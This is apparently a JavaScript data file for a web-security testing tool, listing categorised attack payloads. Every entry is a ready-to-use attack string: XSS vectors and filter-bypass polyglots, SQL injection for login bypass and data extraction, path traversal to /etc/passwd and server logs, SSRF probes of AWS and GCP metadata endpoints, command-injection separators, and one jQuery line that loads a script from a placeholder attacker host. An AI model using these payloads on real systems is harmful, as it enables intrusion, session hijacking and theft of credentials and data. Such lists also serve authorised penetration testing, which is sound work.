export const payloadCategories = [
  {
    id: "xss",
    name: "XSS",
    sections: [
      {
        title: "HTML Tags",
        payloads: [
          { name: "Script Tag", code: "<script>alert(1)</script>" },
          { name: "Body Onload", code: "<body onload=alert(1)>" },
          { name: "Img Error", code: "<img src=x onerror=alert(1)>" },
          { name: "Iframe JS", code: "<iframe src=javascript:alert(1)>" },
          { name: "Input Autofocus", code: "<input onfocus=alert(1) autofocus>" },
          { name: "Details Toggle", code: "<details ontoggle=alert(1)>" },
          { name: "Svg Onload", code: "<svg/onload=alert(1)>" },
          { name: "Marquee Loop", code: "<marquee onstart=finish()>" },
          { name: "Object Data", code: "<object data=javascript:alert(1)>" },
          { name: "Audio Error", code: "<audio src=x onerror=alert(1)>" },
          { name: "Video Error", code: "<video src=x onerror=alert(1)>" }
        ]
      },
      {
        title: "Attributes",
        payloads: [
          { name: "Onload", code: "onload=alert(1)" },
          { name: "Onerror", code: "onerror=alert(1)" },
          { name: "Onmouseover", code: "onmouseover=alert(1)" },
          { name: "Onfocus", code: "onfocus=alert(1)" },
          { name: "Oninput", code: "oninput=alert(1)" },
          { name: "Onchange", code: "onchange=alert(1)" },
          { name: "Onanimationstart", code: "onanimationstart=alert(1)" },
          { name: "Onwheel", code: "onwheel=alert(1)" },
          { name: "Oncopy", code: "oncopy=alert(1)" },
          { name: "Onpaste", code: "onpaste=alert(1)" }
        ]
      },
      {
        title: "JavaScript / URIs",
        payloads: [
          { name: "Javascript URI", code: "javascript:alert(1)" },
          { name: "VBscript URI", code: "vbscript:msgbox(\"XSS\")" },
          { name: "Data URI", code: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" },
          { name: "Unicode Escape", code: "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e" },
          { name: "Hex Encoding", code: "%3Cscript%3Ealert(1)%3C%2Fscript%3E" },
          { name: "Eval Code", code: "eval('alert(1)')" },
          { name: "SetTimeout", code: "setTimeout('alert(1)',0)" }
        ]
      },
      {
        title: "DOM Based",
        payloads: [
          { name: "Document Write", code: "document.write('<img src=x onerror=alert(1)>')" },
          { name: "Document Cookie", code: "document.cookie='user=<script>alert(1)</script>'" },
          { name: "Window Location", code: "window.location='javascript:alert(1)'" },
          { name: "Inner HTML", code: "element.innerHTML='<img src=x onerror=alert(1)>'" },
          { name: "Location Hash", code: "eval(location.hash.slice(1))" },
          { name: "Window Name", code: "eval(window.name)" },
          { name: "Local Storage", code: "localStorage.setItem('xss', '<img src=x onerror=alert(1)>')" }
        ]
      },
      {
        title: "jQuery",
        payloads: [
          { name: "Append", code: "$('body').append('<script>alert(1)</script>')" },
          { name: "Prepend", code: "$('body').prepend('<script>alert(1)</script>')" },
          { name: "Wrap", code: "$('img').wrap('<div onerror=alert(1)></div>')" },
          { name: "GetScript", code: "$.getScript('http://attacker.com/xss.js')" },
          { name: "Selector Injection", code: "$('<img src=x onerror=alert(1)>')" },
          { name: "Old jQuery (CVE)", code: "$('#<img src=x onerror=alert(1)>')" }
        ]
      },
      {
        title: "Polyglots & Other",
        payloads: [
          { name: "Space Polyglot", code: "javascript://%250Aalert(1)//" },
          { name: "Comment Opener", code: "<!--<script>alert(1)-->" },
          { name: "Ah, the Classic", code: "\"><script>alert(1)</script>" },
          { name: "Ultimate Polyglot 1", code: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e" },
          { name: "Ultimate Polyglot 2", code: "\">><marquee><img src=x onerror=confirm(1)></marquee>\"</textarea>’>”></iframe><script>alert(1)</script>" },
          { name: "Locator 1", code: "\";alert(1)//" },
          { name: "Filter Bypass 1", code: "<scr<script>ipt>alert(1)</scr</script>ipt>" }
        ]
      }
    ],
    payloads: [] 
  },

  {
    id: "sqli",
    name: "SQL Injection",
    payloads: [
      { name: "Auth Bypass", code: "' OR 1=1 -- " },
      { name: "Boolean True", code: "' OR '1'='1" },
      { name: "Boolean False", code: "' AND '1'='2" },
      { name: "Union Select Basic", code: "' UNION SELECT NULL,NULL,NULL -- " },
      { name: "Union Select String", code: "' UNION SELECT 'abc','def','ghi' -- " },
      { name: "MySQL Sleep", code: "' AND SLEEP(5) -- " },
      { name: "Postgres Sleep", code: "'; SELECT pg_sleep(5); -- " },
      { name: "Error-Based", code: "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x)a)-- -" }
    ]
  },

  {
    id: "lfi",
    name: "Local File Inclusion",
    payloads: [
      { name: "Basic Traversal", code: "../../../../../etc/passwd" },
      { name: "Double Encoding", code: "%2e%2e%2f%2e%2e%2fetc/passwd" },
      { name: "Null Byte", code: "../../../../etc/passwd%00" },
      { name: "PHP Filter", code: "php://filter/convert.base64-encode/resource=index.php" },
      { name: "Proc Environ", code: "/proc/self/environ" },
      { name: "Apache Logs", code: "/var/log/apache2/access.log" },
      { name: "Nginx Logs", code: "/var/log/nginx/access.log" }
    ]
  },

  {
    id: "ssrf",
    name: "SSRF",
    payloads: [
      { name: "Localhost HTTP", code: "http://127.0.0.1/" },
      { name: "Loopback", code: "http://[::1]/" },
      { name: "Docker Gateway", code: "http://172.17.0.1/" },
      { name: "AWS Metadata", code: "http://169.254.169.254/latest/meta-data/" },
      { name: "GCP Metadata", code: "http://metadata.google.internal/computeMetadata/v1/" },
      { name: "File Protocol", code: "file:///etc/passwd" },
      { name: "FTP", code: "ftp://127.0.0.1:21" }
    ]
  },

  {
    id: "cmd",
    name: "Command Injection",
    payloads: [
      { name: "Semicolon", code: "; id" },
      { name: "Pipe", code: "| whoami" },
      { name: "And", code: "&& id" },
      { name: "Or", code: "|| id" },
      { name: "Backticks", code: "`id`" },
      { name: "Subshell", code: "$(id)" },
      { name: "Newline Inject", code: "\nid" }
    ]
  }
];